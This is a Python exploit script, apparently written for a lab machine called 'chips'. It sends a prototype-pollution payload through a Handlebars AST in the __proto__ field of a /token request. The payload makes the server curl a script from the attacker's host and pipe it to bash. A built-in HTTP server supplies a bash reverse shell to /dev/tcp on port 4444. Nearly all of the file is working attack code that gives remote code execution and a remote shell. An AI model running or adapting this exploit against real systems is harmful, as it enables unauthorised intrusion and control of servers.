import httpx
from concurrent.futures import ThreadPoolExecutor
from http.server import HTTPServer, SimpleHTTPRequestHandler

proxy = {
        "http://": "http://localhost:8080",
        "https://": "http://localhost:8080",
}

client = httpx.Client(
        verify=False,
        timeout=10.0,
        proxies=proxy,
)

# Config
TARGET_IP = "chips"
TARGET_PORT = "80"
ATTACKER_IP = "192.168.45.240"
REVSHELL_PORT = "4444"
HTTPSERVER_PORT = "80"
URL = f"http://{TARGET_IP}:{TARGET_PORT}/"

class CustomHTTPHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(f"#!/bin/bash\n/bin/bash -i >& /dev/tcp/{ATTACKER_IP}/{REVSHELL_PORT} 0>&1".encode());

def run_background_http_server():
    server = HTTPServer((ATTACKER_IP, int(HTTPSERVER_PORT)), CustomHTTPHandler)
    executor = ThreadPoolExecutor()
    executor.submit(server.serve_forever)
    executor.shutdown(wait=False)

if __name__ == "__main__":
    run_background_http_server()

    options = {
	  "connection": {
		"type": "rdp",
		"settings": {
		  "hostname": "rdesktop",
		  "username": "abc",
		  "password": "abc",
		  "port": "3389",
		  "security": "any",
		  "ignore-cert": "true",
		  "client-name": "",
		  "console": "false",
		  "initial-program": "",
		  "__proto__": {
  		    "type": "Program",
   			"body":[{
      			"type": "MustacheStatement",
      			"path":0,
      			"loc": 0,
      			"params":[{
      			    "type": "NumberLiteral",
                    "value": "console.log(process.mainModule.require('child_process').execSync('curl http://192.168.45.240|bash').toString())" 
      			}]
    		}]
		  }
		}
	  }
	}

    res = client.post(f"{URL}token", json=options)
    assert res.status_code == 200
   
    token = res.json()

    res = client.get(f"{URL}rdp", params=token)
    assert res.status_code == 200

    headers = {
        "Sec-WebSocket-Version": "13",
        "Origin":"http://chips",
        "Sec-WebSocket-Protocol": "guacamole",
        "Sec-WebSocket-Key": "Ueruy5bI2/12XXDGrU+LjA==",
        "Connection": "keep-alive, Upgrade",
        "Upgrade": "websocket"
    }

    res = client.get(f"{URL}guacalite", params=token, headers=headers)
    assert res.status_code == 101

    res = client.get(f"{URL}")

    #if "From pendingContent" in res.text:
    #    print("Prototype Pollution succeeded.")